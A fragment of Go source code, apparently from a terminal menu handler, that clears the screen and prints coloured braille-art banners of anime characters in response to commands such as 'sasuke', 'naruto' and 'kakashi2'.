this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣯⣝⢿⣿⣮⣿⣿⣧⢿⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⢻⣿⣿⣿⣿⣿⣿⡟⣼⣿⣿⢟⣿⣾⣳⢕⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣷⡻⣿⣿⣿⣿⣿⣏⢿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣸⣿⣿⣿⣿⣿⡿⣼⣿⣿⣿⣿⣿⠿⣳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣮⡻⣿⣿⣿⣿⣷⡽⣿⣿⣿⣿⣿⠼⠿⠿⢏⣿⣿⣿⣿⢟⣼⣿⣿⣿⣿⠟⣫⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
this.conn.Write([]byte("\033[0;93m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣝⣛⣭⣭⣽⣎⣛⣫⣻⣽⣿⣿⣿⣾⣿⣛⢿⢿⣭⣿⡸⢿⣫⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
       continue      
}
if err != nil || cmd == "sasuke" || cmd == "SASUKE" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢫⣾⠿⠿⠿⠟⠛⣉⣽⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠉⠄⠄⠄⠄⠄⠄⠄⠄⠈⠉⠱⠿⠿⠿⢿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣴⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⣉⡹⠿⠇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠻⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠰⡦⠄⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣷⣍⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⢠⠄⢀⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⣯⠿⠒⠊⡁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⣸⡄⢸⣿⡟⣵⡲⣭⣾⠄⠄⣤⠄⠄⠄⠄⠄⠄⠰⠒⢸⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⣻⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠄⣿⣧⢸⣟⣁⣓⣻⣼⡟⠄⢠⣿⠄⠄⠄⠄⠄⠄⢨⠁⢨⢘⡃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⡿⠃⠙⠄⣌⢉⡏⠼⠛⡿⣿⡿⣿⠄⠄⠄⠄⠄⣀⣉⣉⠈⠉⣉⢉⠛⠛⠃⠄⠘⠛⠄⡀⠄⠄⠄⠄⠸⠄⠸⢸⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣷⣿⣿⣭⣭⣭⡏⠄⠄⠄⠁⠈⠙⠄⠄⠜⠏⠓⠊⠄⠄⠄⠄⠄⣿⠉⠉⢘⢷⣮⣽⣿⣿⣶⣾⡋⠉⠉⣯⠄⠄⠄⠄⠄⡀⣸⣸⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣶⣶⣬⣭⣭⣭⣽⡄⠄⠄⢤⣾⠰⡖⠄⠄⠄⠄⠈⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⠿⠿⠿⠇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣻⣿⣿⣿⣿⣿⣿⠿⠄⠄⠄⢿⠁⠆⠄⠄⠄⢠⡀⠄⠄⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⠄⠄⢿⠉⢻⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣷⠄⠄⠄⠄⠂⠄⠄⠄⠄⠘⠁⠄⡆⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⠄⣤⢠⣤⣤⣽⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣯⣿⣿⣭⢹⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⠄⠄⠄⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠄⠄⢰⣿⣾⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⢸⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢾⣇⣧⠄⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠄⠄⢀⠾⠚⢹⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣟⣀⣀⣻⣇⣂⣺⣿⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣦⠄⠄⠉⠑⠄⠣⠷⣿⡿⣿⣿⣿⣿⣿⢿⠯⠞⠚⠁⠄⠄⠄⠄⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠉⠉⠉⠁⠄⠄⠄⠄⠄⠄⠄⠄⢀⣿⣿⣿⣿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣭⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠉⠉⠉⠉⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠠⠄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠙⠲⣦⣤⣤⣤⣄⣀⣀⣀⣀⣀⣀\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠘⣿⣿⣿⣛⣿⣿⣿⣿⣿⣿\033[0m \r\n"))
       continue      
       }
if err != nil || cmd == "naruto" || cmd == "NARUTO" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⡦⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣄⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⢀⡀⢠⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢿⣷⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠒⠂⠄⠄⠄⠠⠄⠄⠄⠄⠄⠄⠄⠘⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⢈⡄⣠⠄⠄⠄⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⣩⣟⣿⣿⢿⣿⡿⠉⠉⠉⠁⣀⣀⣀⣀⣀⡀⠄⠄⠄⠄⠉⠉⠉⣿⡿⣿⣿⡯⠄⠲⠠⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣤⣷⣧⡆⠄⠄⣻⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣒⣛⣻⡟⠋⢸⡟⢱⣿⣿⣿⣿⣿⣿⡿⢛⣛⡻⣛⣿⣿⣿⣶⣖⡀⢻⡇⢻⣿⡇⠄⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠐⠄⠄⠐\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⡿⡇⠄⠄⢿⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣆⠄⠘⠄⠸⣿⣿⣿⣿⣿⡿⢱⡋⣬⠙⣿⣿⣿⣿⣿⡟⡇⢸⠃⠄⢻⡇⠄⠄⠄⢀⡄⢀⣠⣶⡆⠄⠄⢀⠄⠄⠄⠄⠄⠄⢀⠃⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣿⣶⣷⠄⠄⣾⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿⠄⠄⠄⢸⣿⣿⣿⣿⣿⣁⣃⣙⣋⣼⣿⣿⣿⣿⣿⡿⠇⠈⠄⠄⣏⢿⣿⣿⡦⢿⣷⣾⣿⣿⡇⠄⣸⣼⠄⠄⢠⣤⡄⠄⣼⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⢻⣿⡻⢳⠄⠄⠙⠓⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⠿⣿⣯⣦⣤⣤⣄⣉⠉⠉⢉⣉⣉⣉⣉⣉⣉⣉⣉⢁⠄⠄⣀⣀⣀⢀⠠⠁⢨⣿⣿⣿⣿⣿⡿⣿⣿⡇⡼⣿⣷⠄⠄⢸⣿⣿⠄⡋⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⢨⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⢻⣿⣷⣿⢿⣿⡏⣴⠡⡀⡀⡹⣙⢻⣿⣿⣿⣛⣝⠄⠄⠄⣶⠙⣿⢸⣹⡆⢸⣿⣿⣿⣿⣿⣿⡈⢿⠇⣡⣿⣿⠄⠄⢸⣿⣿⡄⠃⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣾⣿⣿⣽⣸⣿⣿⣾⣷⣿⣶⣷⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣯⣾⣿⠐⢅⣻⣿⣿⣿⣯⣽⣿⣿⣿⣿⢀⡗⣿⣿⣄⠄⠸⣿⣿⡇⡄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⢠⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿⡽⣯⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢰⢳⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⠸⣿⣿⣿⣿⡀⠄⣿⣿⣧⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⣿⣷⡆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿⣿⣿⡻⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⡝⢥⣾⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣿⣿⡇⠄⣿⣿⡿⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣀⠄⠄⢸⣿⣧⣿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿⣿⡟⠱⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣟⡿⠈⣾⣿⣿⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⣿⣿⡇⢠⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⣿⣶⣄⡜⠃⣿⢿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⣿⣿⣿⣿⣿⠃⠄⠿⢿⣿⣿⣿⣿⣻⣿⣿⣽⣿⣿⣷⣾⣿⣿⢟⠰⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠂⣿⣿⡇⣿⢠⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⢿⡿⠁⣷⣤⡈⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠂⠄⠸⡛⠁⠄⠄⡀⠈⢸⣝⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣫⡆⠄⠄⠄⠸⣿⡿⣻⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠁⣿⣿⡇⣷⢰⢠\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠈⠁⢰⣾⣿⣯⣀⠄⠄⠄⢠⡀⠄⠄⠄⠄⠄⠄⠄⠄⠤⡘⠄⠠⠁⠐⠡⠑⠈⢻⣿⣟⡿⢿⣿⣿⣿⢿⣫⣿⠟⠃⠄⠄⠄⠄⠈⠄⠊⣇⢤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠄⢀⣽⣿⠸⣿⢿⣼\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⡄⠄⢸⣿⣿⣿⣿⠄⠄⠄⢘⣇⠄⠄⠄⠄⠄⠄⠠⢴⠈⠄⡠⠈⠂⠄⠐⠄⠄⠄⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠄⠄⠄⠄⠄⠄⠄⠐⣚⠻⣿⣧⠞⠛⠛⣿⣟⣿⣿⣿⣿⣿⣿⣯⡽⡛⠄⢻⡜⡛\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⡇⠄⠈⣿⣿⣿⣿⠄⠄⢀⣿⣷⠄⠄⠄⠄⠄⠄⠄⠄⠄⠨⠄⠁⠄⠂⠄⠄⠄⠄⢸⣿⣿⣿⣿⣿⣿⡅⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠸⣿⣦⣝⣂⡐⠛⢋⣽⡿⣯⣿⡿⠿⢿⡿⠄⠄⠄⢼⣿⡁\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠇⠄⠄⣿⣿⣿⡟⠄⠄⣿⣿⣻⠄⠄⠄⠄⠄⣀⣠⣶⠄⠄⠁⡔⡀⠄⠄⠄⠄⠈⠘⣿⣿⣿⣿⣿⣿⣇⠄⠄⠄⠄⠄⠄⠄⠄⠄⣠⣾⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣯⣣⠄⠄⠉⠄⠄⢠⢸⣿⡇\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⡄⠄⢠⣿⣿⣿⣷⠄⠄⢸⣿⣷⠄⢀⣠⣴⣾⣿⣿⣿⣯⡉⢐⣽⣧⡀⠄⠄⠄⠄⠢⢿⣿⣿⣿⣿⣿⣿⡀⠄⠄⠄⠄⠄⠄⢠⣾⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠄⠄⠄⠈⠈⣿⡇\033[0m \r\n"))
	continue      
       }
if err != nil || cmd == "kakashi2" || cmd == "KAKASHI2" {
this.conn.Write([]byte("\033[2J\033[1H"))
this.conn.Write([]byte("\033[1;49;36m⠿⠒⠉⠛⣟⣛⣛⣛⡛⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⠿⠿⣛⠛⣿⣿⠭⣹⣿⣿⣿⣨⣽⣾⣿⣿⣿⣿⣧⣿⣟⣉⣉⣉⣉⣉⡩⣯⣭⣭⣭⣭⣭⣭⣤⣤⣤⣤⡬⠭⠬⠭⠭⠭⠭⠭\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠰⠶⠶⠶⠶⠙⠛⠛⠛⠶⠶⠞⠛⠛⠛⠛⠛⠛⠒⣿⣉⢗⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣣⢪⠂⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣀⢲⣿⣧⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣵⣇⡁⠒⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣦⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⠉⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠸⠏⠁⠄⠄⠄⡠⣄⣀⡉⠉⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⣿⣿⣿⣿⣿⣶⣦⣤⣉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠓⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⡟⢩⡲⣯⣶⣿⣿⠦⠄⠹⣿⣿⣿⣿⣿⣿⣆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⣀⣀⢀⣀⣀⠉⠙⠛⠾⢮⣭⣿⢿⢻⠅⡀⠄⠄⠹⡏⢻⣿⣿⢿⣿⣆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣿⣿⣿⣿⣯⣍⣻⣶⣤⣄⡀⠄⠑⠐⠣⡙⠄⠄⠄⠄⠁⠄⠹⣿⠄⠄⠙⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢿⣚⣿⣿⣿⣿⠿⠟⠋⠉⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⢿⣿⠿⠋⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⠄⣄⣀⣾⡆⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢀⠄⢤⣂⡠⢀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢐⡋⢲⣾⣿⡆⡏⣿⡄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⣾⠄⠄⠄⢹⣕⠄⠰⡀⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⡇⢸⣿⣿⡄⠄⠉⠇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⡇⠄⠄⠄⣸⢷⠄⣸⡷⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢰⡇⣿⣿⣿⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⠄⠄⠄⠄⣿⡞⣆⡟⡇⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⢿⠋⡍⠹⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸⡆⢰⠟⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
this.conn.Write([]byte("\033[1;49;36m⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠈⣊⠄⡷⡁⡃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢠⣏⠈⣮⢿⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄\033[0m \r\n"))
